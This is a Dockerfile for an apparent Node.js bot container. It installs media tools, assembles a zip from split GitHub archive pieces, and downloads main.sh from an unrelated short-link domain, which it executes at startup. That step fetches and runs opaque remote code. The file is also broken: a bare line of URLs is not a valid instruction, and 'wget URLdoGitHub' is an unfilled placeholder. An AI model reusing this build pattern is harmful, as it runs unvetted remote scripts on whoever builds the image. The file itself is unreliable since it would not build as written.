FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
https://github.com/Ecimar/Botzin-X/raw/main/aa https://github.com/Ecimar/Botzin-X/raw/main/ab https://github.com/Ecimar/Botzin-X/raw/main/ac https://github.com/Ecimar/Botzin-X/raw/main/ad https://github.com/Ecimar/Botzin-X/raw/main/af https://github.com/Ecimar/Botzin-X/raw/main/ag https://github.com/Ecimar/Botzin-X/raw/main/ah https://github.com/Ecimar/Botzin-X/raw/main/ai https://github.com/Ecimar/Botzin-X/raw/main/aj https://github.com/Ecimar/Botzin-X/raw/main/ak https://github.com/Ecimar/Botzin-X/raw/main/al https://github.com/Ecimar/Botzin-X/raw/main/am
RUN wget URLdoGitHub
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
